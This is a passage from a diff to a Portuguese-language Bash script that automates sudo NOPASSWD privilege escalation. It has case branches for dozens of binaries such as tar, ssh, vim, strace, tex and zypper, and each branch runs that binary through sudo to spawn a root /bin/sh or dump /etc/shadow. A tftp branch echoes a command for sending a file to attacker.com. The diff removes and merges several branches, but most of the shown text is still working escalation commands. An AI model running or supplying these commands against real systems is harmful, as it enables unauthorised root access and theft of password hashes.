             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1384,14 +1089,6 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" stdin exec:/bin/sh
             ;;
-        soelim)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
-        softlimit)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
-            ;;
         sort)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -m /etc/shadow
@@ -1420,17 +1117,9 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -D ./lib.so
             ;;
-        ssh-keyscan)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -f /etc/shadow
-            ;;
         ssh)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -o ProxyCommand=';sh 0<&2 1>&2' x
-            ;;
-        sshpass)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
             ;;
         start-stop-daemon)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1443,18 +1132,6 @@ EOF
         strace)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -o /dev/null /bin/sh
-            ;;
-        strings)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
-        su)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            ;;
-        sudo)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
             ;;
         sysctl)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1478,10 +1155,6 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -s 'RANDOM' /etc/shadow
             ;;
-        tail)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -c1G /etc/shadow
-            ;;
         tar)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
@@ -1494,16 +1167,7 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" 1 /bin/sh
             ;;
-        tasksh)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            !/bin/sh
-            ;;
-        tbl)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
-        tclsh)
+        tclsh|wish)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" 
             exec /bin/sh <@stdin >@stdout 2>@stderr
@@ -1543,23 +1207,11 @@ EOF
             echo "sudo "$paths" console"
             echo "file("file_to_read")"
             ;;
-        tex)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" --shell-escape '\write18{/bin/sh}\end'
-            ;;
         tftp)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
             echo "RHOST=attacker.com"
             echo "sudo tftp $RHOST"
             echo "put file_to_send"
-            ;;
-        tic)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -C /etc/shadow
-            ;;
-        time)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
             ;;
         timedatectl)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1574,10 +1226,6 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -c /bin/sh
             ;;
-        tmux)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            ;;
         top)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
@@ -1585,33 +1233,9 @@ EOF
             sudo "$paths"
             reset
             ;;
-        torify)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
-            ;;
-        torsocks)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
-            ;;
-        troff)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
-        ul)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
         unexpand)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -t99999999 /etc/shadow
-            ;;
-        uniq)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
-        unshare)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
             ;;
         unsquashfs)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
@@ -1635,11 +1259,7 @@ EOF
             id
             echo "[+] Nao esqueca de restaurar o arquivo passwd --> /tmp/passwdBKP"
             ;;
-        uudecode)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow /dev/stdout | "$paths"
-            ;;
-        uuencode)
+        uudecode|uuencode)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" /etc/shadow /dev/stdout | "$paths"
             ;;
@@ -1648,10 +1268,6 @@ EOF
             cd $(mktemp -d)
             echo 'exec "/bin/sh"' > Vagrantfile
             sudo "$paths" up
-            ;;
-        valgrind)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /bin/sh
             ;;
         varnishncsa)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1681,10 +1297,6 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
             echo "Pressione ENTER, e em seguida ':!COMANDO'"
             sudo "$paths" -c ':!/bin/sh'
-            ;;
-        vipw)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
             ;;
         virsh)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1738,11 +1350,6 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" --textbox --scrolltext /etc/shadow 0 0
             ;;
-        wish)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            exec /bin/sh <@stdin >@stdout 2>@stderr
-            ;;
         xargs)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -a /dev/null sh
@@ -1759,21 +1366,9 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
             sudo "$paths" -shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
             ;;
-        xetex)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" --shell-escape '\write18{/bin/sh}\end'
-            ;;
         xmodmap)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" -v /etc/shadow
-            ;;
-        xmore)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
-            ;;
-        xpad)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" -f /etc/shadow
             ;;
         xxd)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
@@ -1786,10 +1381,6 @@ EOF
         yarn)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             sudo "$paths" exec /bin/sh
-            ;;
-        yash)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
             ;;
         yum)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
@@ -1807,14 +1398,6 @@ EOF
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
             TF=$(mktemp -u)
             sudo "$paths" $TF /etc/hosts -T -TT 'sh #' </dev/tty
-            ;;
-        zsh)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            ;;
-        zsoelim)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths" /etc/shadow
             ;;
         zypper)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
